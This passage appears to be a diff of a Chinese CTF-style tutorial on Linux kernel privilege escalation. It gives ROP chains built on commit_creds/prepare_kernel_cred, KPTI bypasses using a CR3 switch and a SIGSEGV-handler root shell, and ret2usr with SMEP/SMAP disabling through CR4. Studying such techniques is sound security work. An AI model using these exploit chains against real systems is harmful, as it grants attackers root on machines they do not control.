@@ -271,6 +271,9 @@ __int64 __fastcall core_copy_func(__int64 a1)
 
 接下来就可以写出利用板子，包括状态保存、地址泄漏、漏洞触发（其中找偏移有很多种方法，笔者通常用 gdb 加载有符号的 vmlinux 来看）：
 
+> [!INFO] 
+> 笔者通常使用 ROPgadget 导出到 nvim 中找 gadget，但是 ROPgadget 在默认情况下找不到 `iretq`，之前尝试过 rp++，找到的 gadget 也有问题，可以用 `objdump -M intel -d vmlinux` 来找相关 gadget
+
 ```c
 // author: @eastXueLian
 // usage : eval $buildPhase
@@ -297,11 +300,15 @@ int main() {
 
     size_t init_cred = kaslr_offset + 0xffffffff8223d1a0;
     size_t commit_creds = kaslr_offset + 0xffffffff8109c8e0;
+    size_t prepare_kernel_cred = kaslr_offset + 0xffffffff8109cce0;
     size_t swapgs_restore_regs_and_return_to_usermode =
         kaslr_offset + 0xffffffff81a008da;
 
     size_t pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
-    size_t iretq = kaslr_offset + 0xffffffff82714844;
+    size_t pop_rdx_ret = kaslr_offset + 0xffffffff810a0f49;
+    size_t mov_rdi_rax_jmprdx = kaslr_offset + 0xffffffff8106a6d2;
+    size_t mov_cr3_rax_ret = kaslr_offset + 0xffffffff8107c33e;
+    size_t iretq = kaslr_offset + 0xffffffff81050ac2;
     size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;
 
     info("STEP 1 - Stack Overflow");
@@ -322,3 +329,160 @@ int main() {
 ---
 
 ## 常规 ROP
+
+对于最原始的情况，提权只需要布置好 `commit_creds(prepare_kernel_cred(NULL))` 的 ROP 链即可。因为 kernel 中的 gadgets 非常充足，设置参数 rdi 为上一个函数的返回值 rax 也不是什么难事：
+
+```c
+    info("\tSolution 1.1 - Normal ROP");
+    buf[i++] = pop_rdi_ret;
+    buf[i++] = 0;
+    buf[i++] = prepare_kernel_cred;
+    buf[i++] = pop_rdx_ret;
+    buf[i++] = commit_creds;
+    buf[i++] = mov_rdi_rax_jmprdx;
+    buf[i++] = swapgs_popfq_ret;
+    buf[i++] = 0;
+    buf[i++] = iretq;
+    buf[i++] = (size_t)get_shell;
+    buf[i++] = user_cs;
+    buf[i++] = user_rflags;
+    buf[i++] = user_sp;
+    buf[i++] = user_ss;
+    log(i);
+```
+
+> [!NOTE] 
+> 但是布置上述 ROP 链发现提权失败了：`Segmentation fault`，这是因为 Linux 4.15 中就引入了内核页表隔离 KPTI 机制，并且反向移植到了 4.14.11，4.9.75，4.4.110 上。
+
+---
+
+## KPTI - 内核页表隔离
+
+> [!NOTE] 
+> KPTI 不支持运行过程中开启或关闭，可以在 cmdline 中增加 `kpti=1` 或 `nopti` 来控制是否启用。
+
+顾名思义，内核页表隔离就是 ~~隔离了内核态页表和用户态页表（什么废话）~~ 。Linux 中使用四级页表，而最上层的 PGD 页全局目录就存储在 **CR3** 寄存器中，要实现虚拟地址到真实地址的映射就依赖于 CR3 的值，因此 KPTI 就在此之上实现了两套页表用来隔离用户态空间和内核态空间：
+
+```c
+No PTI:                          With PTI:
+
++----------+                     +----------+  
+|          |                     |          |  
+| Kernel   |                     | Kernel   |  
+|          |                     |          |  
+| Space    |                     | Space    |  +----------+
+|          |                     |          |  | Incomplete Kernel Code
+|----------|                     |----------|  |----------|
+|          |                     |          |  |          |
+| User     |                     | User (NX)|  | User     |
+|          |                     |          |  |          |
+| Space    |                     | Space    |  | Space    |
+|          |                     |          |  |          |
++----------+                     +----------+  +----------+
+内核态和用户态使用相同的页表            内核态页表    用户态页表
+```
+
+这种隔离带来了如下限制：
+
+- 在内核态中映射了 **完整用户空间和内核空间** ，但是 **用户空间** 的所有页顶级表项都被标记了 **NX 不可执行** ，因此 ret2usr 不再可行；
+- 在用户态的这套页表中，只有 **极少量的内核空间映射** ，包括中断处理、系统调用入口等必要的地址。
+
+这两套页表的切换也很直接：
+
+1. 两张表各占 4k，紧挨着存放在连续的内存空间中，并且起始地址对齐到页；
+2. 内核页表在低地址，用户页表在高地址；
+3. 由 1，2 就可以发现切换页表时只需要反转 `CR3[12]` 的二进制位。
+
+### 设置 CR3 切换页表
+
+因此在开启 KPTI 的情况下，可以再观察内核代码中返回用户态的 gadget，相关代码在 `arch/x86/entry/entry_64.S` 的 `swapgs_restore_regs_and_return_to_usermode` 函数中，切换的代码简化为：
+
+```c
+mov rdi, cr3;
+or rdi, 0x1000;
+mov cr3, rdi;
+```
+
+因此可以构造出如下 ROP 链：
+
+```c
+    info("\tSolution 1.2 - Set CR3 with swapgs_restore_regs_and_return_to_usermode");
+    buf[i++] = pop_rdi_ret;
+    buf[i++] = init_cred;
+    buf[i++] = commit_creds;
+    buf[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
+    i += 2;
+    buf[i++] = (size_t)get_shell;
+    buf[i++] = user_cs;
+    buf[i++] = user_rflags;
+    buf[i++] = user_sp;
+    buf[i++] = user_ss;
+    log(i);
+```
+
+### signal 系统调用劫持 SEGV 信号
+
+可以注意到上面的报错是 SEGV 而不是 kernel panic，这是因为程序已经结束 ROP，用 `iretq` 返回用户态时，因为 CR3 还保留着内核态的那套页表，导致用户空间代码没有执行权限：
+
+1. 用户态踩到没有执行权限的内存；
+2. 触发异常，进入内核态处理；
+3. 发送段错误信号，回到用户态；
+4. 用户态收到 SEGV 信号，终止程序的运行；
+
+因为此时在内核态是正常的异常处理流程，并且结束后还会成功切换页表回到用户态，因此只需要能 hook 掉 SEGV 信号的处理流程，让程序执行想要的用户态代码即可：
+
+```c
+void segfault_handler(int sig) {
+    // 定义 handler 函数
+    success("Returning root shell:");
+    get_shell();
+    exit(0);
+}
+
+// ...
+// 在 main 函数最开始的地方，调用 signal hook 掉 SEGV 的信号处理流程
+    signal(SIGSEGV, segfault_handler);
+```
+
+于是就可以绕过 KPTI 保护成功提权了。
+
+---
+
+## ret2usr 与 SMEP / SMAP 保护
+
+> [!INFO] 
+> ret2usr 的攻击手段随着 KPTI 的出现已经消声觅迹了，不过还是可以结合看看 SMEP / SMAP 保护的基本原理与绕过。
+
+> [!NOTE] 
+> - SMEP 即 Supervisor Mode Execution Protection，禁止执行用户空间代码；
+> - SMAP 即 Supervisor Mode Access Protection，禁止访问用户空间代码；
+>
+> 那在 SMAP 开启后内核该怎么执行 copy to / from user 函数呢？
+>
+> 可以参考到源码：一路跟入 [copy_from_user](https://elixir.bootlin.com/linux/v5.8/source/include/linux/uaccess.h#L141) 能发现最终调用到 [stac](https://elixir.bootlin.com/linux/v5.8/source/arch/x86/include/asm/smap.h#L50)，这会设置 `RFLAGS.AC` 标志位，可以暂时关闭 SMAP，在结束之后再调用 clac 重置标志位来重新开启 SMAP。
+>
+> [Reference - How does the linux kernel temporarily disable x86 smap in copy from user](https://stackoverflow.com/questions/61440985/how-does-the-linux-kernel-temporarily-disable-x86-smap-in-copy-from-user)
+
+直接的 ret2usr 写起来非常简单，省去了找 ROP 链的麻烦：
+
+```c
+// 用户态用函数指针写个 commit_creds(prepare_kernel_cred(NULL)) 即可：
+void get_root(void) {
+    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
+    int (*commit_creds_ptr)(void *) = commit_creds;
+    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+}
+```
+
+对于没有开启 SMEP / SMAP / KPTI 保护的情况下，直接在内核态下跳转到上述函数地址就能实现提权，因为内核态保留了对用户空间的完整映射。但是对于开启了 SMEP / SMAP 的情况，内核态下访问用户空间会直接引起 kernel panic。
+
+而 CR4 寄存器的 `CR4[20]` 和 `CR4[21]` 分别标识了 SMEP / SMAP 的开启和关闭，可以找到 kernel 中的 gadget：
+
+1. 方法 1 - 直接将 `0x6f0` 存入 CR4 寄存器；
+2. 方法 2 - 通过运算将 CR4 的相应位置清零。
+
+但是在开启 KPTI 后，若在内核态下在调用到用户态的代码，就相当于在内核态下执行没有执行权限的内存地址，会直接导致 kernel panic，因此 ret2usr 已经过时。
+
+---
+
+## pt-regs
